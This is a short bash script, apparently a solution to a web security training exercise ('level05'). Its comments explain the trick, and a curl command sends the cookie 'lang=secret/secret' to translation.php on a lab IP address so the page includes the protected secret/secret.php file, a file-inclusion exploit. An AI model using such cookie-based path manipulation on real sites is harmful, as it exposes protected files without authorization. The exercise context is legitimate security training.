#! /usr/bin/env bash

# In this exercise, it is not possible to set the variable 'lang' to a value diferent from "de" or "en" via POST,
# so secret/secret.php cannot be accessed this way. But by setting the cookie 'lang' to "secret/secret" via GET,
# it is possible to access secret/secret.php.
curl --cookie "lang=secret/secret" http://10.0.23.24:8002/level05/translation.php